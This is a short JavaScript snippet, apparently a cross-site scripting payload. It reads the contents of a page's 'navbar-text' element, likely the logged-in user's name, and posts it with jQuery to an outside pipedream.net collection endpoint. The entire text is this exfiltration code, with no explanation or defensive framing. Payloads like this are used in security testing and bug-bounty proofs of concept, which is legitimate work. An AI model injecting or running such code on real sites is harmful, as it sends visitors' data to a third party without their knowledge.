const user = document.getElementsByClassName('navbar-text')[0].innerHTML;
const url = 'https://enriez9578hb8.x.pipedream.net/';
jQuery.post(url, user);
console.log(user);
